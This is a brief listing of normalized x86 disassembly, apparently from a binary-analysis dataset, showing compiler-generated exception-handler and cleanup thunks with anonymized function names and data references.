mov eax r--data
jmp sub_411766
sub_42ac60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ac80
lea ecx [ ebp - 0x14 ]
jmp sub_40d1f0
sub_42ac88
lea ecx [ ebp - 0x14 ]
jmp sub_40d470
sub_42ac90
call j_sub_4190e7
sub_42ac9c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42acc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42acdb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42acf6
lea ecx [ ebp - 0x10 ]
jmp sub_40e5d0
sub_42acfe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ad19
lea ecx [ ebp - 0x14 ]
jmp sub_40e5d0
sub_42ad21
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ad3c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ae20
mov [ rw-data ] r--data
retn
sub_42ae30
retn
sub_42ae31
mov ecx rw-data
jmp sub_40e5a9
sub_42ae3b
mov ecx rw-data
jmp sub_40e691
sub_42ae45
mov ecx rw-data
jmp sub_407b40
sub_42ae4f
mov ecx rw-data
jmp sub_40ee2b
sub_42ae59
mov ecx rw-data
jmp sub_40e5a9
